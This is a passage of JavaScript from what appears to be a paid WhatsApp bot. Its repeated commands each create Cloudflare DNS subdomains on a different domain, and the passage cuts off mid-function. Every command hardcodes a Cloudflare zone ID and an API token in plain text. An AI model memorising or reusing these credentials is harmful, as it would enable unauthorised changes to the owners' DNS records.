        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "128fe0f8f9f09ecce73e5c34c6a31444";
            let apitoken = "5Mp2HncEE28HzVOpjmvrM_vU1UuWPvGEhhbJ4h6-"
            let tld = "sellerpanell.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d49': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "bc4748bba0b75e8273b04c3dea2dc59c";
            let apitoken = "JKZrkLdzdd7hmT9XVcsXpoVsXmWQ61bQN6r2_oq-"
            let tld = "pannelkuu.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d50': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "b71e957f52cdf4160458e98174e5a0aa";
            let apitoken = "V8ittSBhlpwZ02t_zZ9YaQRo8Ptq-cdM1-3Lv-xs"
            let tld = "miha.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d51': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "3f5d5b68ea37bf7b8a10a9a96b544622";
            let apitoken = "fTKJuqbdce2A-9oeoqhJ9vLfo-EUnLqCCz9OAmKG"
            let tld = "server-smtp1.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d52': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "a0206c68c9b356bdf0a96fbb5d61fbdc";
            let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
            let tld = "my-website.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d53': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "80e208bb5900abc50d4483bdb8590d42";
            let apitoken = "3XpwIR878Fi0IoVyaJl1ggGgyJXuy_pB3g0M8pjz"
            let tld = "smtp1.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d54': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "65f61d0fd65f2c56836b298ab0a546df";
            let apitoken = "ZHIcQDnvj7-OoLwea0ppt42pYKdhfdBOwmzAQoJW"
            let tld = "panellkuu.cloud";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d55': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "493236f2d50d8f4248548e6af71d44aa";
            let apitoken = "GuvNxmBanfeZZVVUMJ-tS6Us7rygf0DtjzIcgy5L"
            let tld = "dzhostingid.com";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d56': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "edf8e5a66859e6a1f8ccbde07c415082";
            let apitoken = "p0gm6UzsPw0Y0eudhfDr1ZBvV_WjX9eMpTp4ksXZ"
            let tld = "didindev.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d57': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "030c4af3a1a8e92bc3588ac2299ed43a";
            let apitoken = "4rLCTnbktVWjsYWfFoirZv40Aqau8i1EhfHW-lIk"
            let tld = "panelstore.xyz";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d58': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "f121b6997da209f413cccfbe14ab87a5";
            let apitoken = "SNwPfp0Chd5aCf_d3PxtDdyBtovvUcV6L-JY2kYf"
            let tld = "yasshost.com";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
